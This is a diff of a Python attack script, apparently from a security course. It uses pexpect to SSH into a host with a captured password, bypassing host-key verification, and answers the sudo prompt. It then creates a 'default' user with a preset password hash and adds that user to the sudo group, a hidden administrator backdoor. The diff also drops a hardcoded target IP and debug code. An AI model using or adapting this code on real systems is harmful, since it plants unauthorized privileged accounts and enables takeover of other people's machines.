@@ -12,49 +12,42 @@ import pexpect
 
 NUMBER_OF_QUESTIONS_ASKED = 3
 
-OUR_ENCRYPTED_PASSWORD = r'\$6\$0mb/OJ.9.a4H5PkD\$0fCeQDMPOBBVERSXe8yt4qjmxvjapc4C.X73qrEaJ/WelKcEvlno9OGCrAHO6L6n/W1Z0d6L28vSGxdx9RMjR.'
+OUR_ENCRYPTED_PASSWORD = 'p0j1kHlO8H0mE'
 CREATE_USER_COMMAND = 'sudo useradd -m -p "' + OUR_ENCRYPTED_PASSWORD + '" -s /bin/bash default'
 ADD_SUDO_GROUP_COMMAND = 'sudo usermod -aG sudo default'
 FINAL_COMMAND = CREATE_USER_COMMAND + " && " + ADD_SUDO_GROUP_COMMAND
 
-print(FINAL_COMMAND)
-
 def check_ssh_conn(host, password, timeout=7, user="class", cmd=FINAL_COMMAND):
-    # TODO after debug
-    host = "147.32.82.210"
+    try:
+        fname = tempfile.mktemp()
+        fout = open(fname, 'wb')
+        options = '-q ' \
+                  '-oStrictHostKeyChecking=no ' \
+                  '-oUserKnownHostsFile=/dev/null ' \
+                  '-oPubkeyAuthentication=no ' \
+                  '-t'
+        ssh_cmd = 'ssh %s@%s %s "%s"' % (user, host, options, cmd)
+        child = pexpect.spawn(ssh_cmd, timeout=timeout)
 
-    # try:
-    fname = tempfile.mktemp()
-    fout = open(fname, 'wb')
-    options = '-q ' \
-              '-oStrictHostKeyChecking=no ' \
-              '-oUserKnownHostsFile=/dev/null ' \
-              '-oPubkeyAuthentication=no ' \
-              '-p 445 ' \   
-              '-t'  # TODO after debug
-    ssh_cmd = 'ssh %s@%s %s "%s"' % (user, host, options, cmd)
-    child = pexpect.spawn(ssh_cmd, timeout=timeout)
+        # ssh password
+        child.expect(['password: '])
+        child.sendline(password)
 
-    # ssh password
-    child.expect(['password: '])
-    child.sendline(password)
+        # sudo password
+        child.expect(['.*password.*class.*'])
+        child.sendline(password)
 
-    # sudo password
-    child.expect(['.*password.*class.*'])
-    child.sendline(password)
+        child.logfile = fout
+        child.expect(pexpect.EOF)
+        child.close()
+        fout.close()
 
-    child.logfile = fout
-    child.expect(pexpect.EOF)
-    child.close()
-    fout.close()
+        fin = open(fname, 'r')
+        fin.close()
+        return child.exitstatus == 0
 
-    fin = open(fname, 'r')
-    fin.close()
-    return child.exitstatus == 0
-
-    # except Exception:
-    #     print
-    #     return False
+    except Exception:
+        return False
 
 
 def ask_for_password(connection):
